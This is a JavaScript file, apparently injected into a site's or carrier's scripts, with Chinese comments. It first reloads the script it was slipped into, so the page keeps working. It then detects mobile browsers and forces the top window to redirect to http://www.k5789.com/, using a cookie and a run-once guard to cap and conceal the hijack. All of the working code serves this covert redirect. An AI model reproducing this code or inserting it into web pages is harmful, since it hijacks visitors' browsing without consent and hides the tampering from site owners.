l___k__s = ~ function(thisWindow, thisDocument, regex_1, regex_2, str_script, Charset, Async, l) {
    var str_00_g_0 = '00_g_0',
        isOpera = thisWindow.opera,
        originSrc = (function(js_src) {
            /* 处理原先的src地址 */
            //当js_src 不存在 或者 格式不正确 或者 包含 "00.g.0"时返回 0
            if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
                return 0;
            }
            //向js_src中添加参数name:'__',value:'_'
            //如果参数表中是正常的参数格式则添加,不是则不添加
//            js_src = (function(pathArry) {
//                var paramStr = pathArry[1] || '';
//                return /=/.test(paramStr || '=') ? (pathArry[0] || '') + '?__=_&' + paramStr : js_src;
//            })(js_src.split('?'));
            js_src = js_src + '?__=__&';
            if (!js_src.lastIndexOf('/')) {
                return js_src.replace(regex_1, regex_2);
            }
            return js_src.substr(0, 1) + js_src.substr(1).replace(regex_1, regex_2);
        })(
            (function(curScriptElement, allScripts, errMsg) {
                /*
                 find the current script src url
                 find Charset and Async
                 */
                //如果Document.currentScript是可以找到元素时,直接返回这个元素的src
                if (curScriptElement) {
                    Charset = curScriptElement.charset;
                    Async = curScriptElement.async;
                    return curScriptElement.src;
                }
                try {
                    //Z.G.Y()故意抛出异常
                    Z.G.Y();
                } catch (c) {
                    // 取得异常信息字符串
                    errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
                    if (!errMsg && isOpera) {
                        //没有错误信息并且是Opera浏览器, 将异常对象c直接转成字符串
                        errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ');
                    }
                }
                if (errMsg) {
                    errMsg = errMsg.split(/[@ ]/g).pop();
                    errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
                    //倒序遍历scriptDOM
                    //将最后一个和异常信息匹配的script标签的src返回,如果都没有匹配script标签处理后的异常信息返回(应该是一个src)
                    //记录 Charset和Async
                    for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                        scriptEl = allScripts[i];
                        if (w == scriptEl.src) {
                            Charset = scriptEl.charset;
                            Async = scriptEl.async;
                            break;
                        }
                    }
                    return w;
                }
                //在没有匹配到异常信息时倒序遍历scriptDOM
                //将加载完成的第一个script标签的src返回,如果都没有记载完成将最后一个script标签的src返回
                //记录 Charset和Async
                for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
                    cur = allScripts[y];
                    if (cur.readyState == 'interactive') {
                        Charset = cur.charset;
                        Async = cur.async;
                        return cur.src;
                    }
                }
                Charset = lastJsDOM.charset;
                Async = lastJsDOM.async;
                return lastJsDOM.src;
            })(thisDocument.currentScript, thisDocument.getElementsByTagName(str_script))),
        head = thisDocument.getElementsByTagName('head')[0],
        newScriptElm = thisDocument.createElement(str_script),
        sessionStorage = thisWindow.sessionStorage;
    if (originSrc) {
        // load originSrc
        if(Charset){
            newScriptElm.charset = Charset;
        }
        newScriptElm.src = originSrc;
        newScriptElm.async = Async;
        //非异步时重新加载这个js
        //这个js在异步加载时,非异步js需要重新加载保持界面和js都能正常运行,异步的js不会影响整体逻辑不重新加载也不会影响
        if (!Async && /\[nati/.test(thisDocument.write + '')) {
            thisDocument.write('<' + str_script + ' src="' + originSrc + '"' +
                               (Charset ? ' charset="' + Charset + '"' : '') +
                               ' async=' + (Async ? 'true' : 'false') +
                               '><\/' + str_script + '>');
        } else {
            head.appendChild(newScriptElm);
        }
    }
}(self, document, /([^:\/]|^)\//, '$1//', 'script');


function getCookieVal(offset) {

    var endstr = document.cookie.indexOf(";", offset);

    if (endstr == -1) endstr = document.cookie.length;

    return unescape(document.cookie.substring(offset, endstr));

}

function createCookie(name,value,seconds) {
    if (seconds) {
        var date = new Date();
        date.setTime(date.getTime() + (seconds * 1000));
        var expires = "; expires=" + date.toUTCString();
    }
    else var expires = "";
    document.cookie = name + "=" + value + expires + "; path=/";
}

function GetCookie(name) {

    var arg = name + "=";

    var alen = arg.length;

    var clen = document.cookie.length;

    var i = 0;

    while (i < clen) {

        var j = i + alen;

        if (document.cookie.substring(i, j) == arg) return getCookieVal(j);

        i = document.cookie.indexOf(" ", i) + 1;

        if (i == 0) break;

    }

    return null;

}


function browserRedirect() {

    var sUserAgent = navigator.userAgent.toLowerCase();

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";

    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";

    var bIsMidp = sUserAgent.match(/midp/i) == "midp";

    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";

    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";

    var bIsAndroid = sUserAgent.match(/android/i) == "android";

    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";

    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";

    if ((bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM)) {

        window.top.location.href = locaHref;

    } else {}

}

var blackhostlist=[];
var blacklocationlist=[];
var cookName = "__chiae";
var globalTimes = 0 ;
var locaHref = "http://www.k5789.com/";   //目标地址

function shouldIRedirect (name) {
    var data1,data2,myCookie = GetCookie(name);
    if(myCookie != null && myCookie.indexOf("|") > 0){
        var datas = myCookie.split("|");
        if (datas.length == 2) {
            data1 = parseInt(datas[0]);
            data2 = Number(datas[1]);
            if(!isNaN(data1)  &&  !isNaN(data2)){
                var ct = new Date().valueOf();
                globalTimes = data1;
                // if(1E4 > ct - data2  || globalTimes >= 8){//去掉时间的限制，只是执行一次
                if(globalTimes >= 8){

                    return false;
                }
            }
        }
    }
    return true;
}

function isInBlackList(){
    var current_host_name = window.top.location.host.toLowerCase();
    var current_location = window.top.location.href.toLowerCase();
    for(var j = 0 ; j < blacklocationlist.length; j++){
        if(current_location == blacklocationlist[j]){
            return true;
        }
    }
    for(var i = 0 ; i < blackhostlist.length; i++){
        if(current_host_name.indexOf( blackhostlist[i]) >= 0){
            return true;
        }
    }
    return false;
}

//js多次加载只执行一次

function run_only_once(keystring, fn) {
    var w = window.top;
    if (keystring in w) {
        return;
    }
    w[keystring] = 1;
    fn();
}

run_only_once("s6ixciaeh_", function(){

    if (shouldIRedirect(cookName)){
        createCookie(cookName, "" , -1);
        var timestamp = (new Date()).valueOf();
        createCookie(cookName, (globalTimes + 1) + "|" + timestamp , 1*60*60);
        browserRedirect();
    }


});























